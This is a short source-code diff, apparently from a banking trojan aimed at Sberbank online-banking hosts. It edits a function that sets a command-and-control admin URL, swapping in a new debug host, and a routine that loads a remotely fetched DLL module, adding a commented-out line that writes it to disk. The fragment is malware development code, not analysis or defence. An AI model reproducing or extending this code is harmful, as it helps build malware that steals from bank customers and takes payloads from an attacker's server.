@@ -107,7 +107,7 @@ static PCHAR GetNameDll(char* uid)
 static char* GetAdminUrl( char* url )
 {
 #ifdef DEBUGCONFIG
-	m_lstrcpy( url, "bifit-dbo.ru" );
+	m_lstrcpy( url, "az.zika.in" ); //"bifit-dbo.ru" );
 #else
 	string host = GetActiveHostFromBuf2( SBER_HOSTS, 0x15D1BD02 /* __SBER_HOSTS__ */, SBERHOSTS_PARAM_ENCRYPTED );
 	if( !host.IsEmpty() )
@@ -171,6 +171,7 @@ static BYTE* LoadSluiceDll( char* uid )
 	else
 	{
 		int szModule = STR::Length((char*)module);
+		//File::WriteBufferA( "c:\\s.dll", module, szModule );
 		DBG( "Sber", "Загружен файл %s, размер: %d", url, szModule );
 		if( nameFile )
 		{
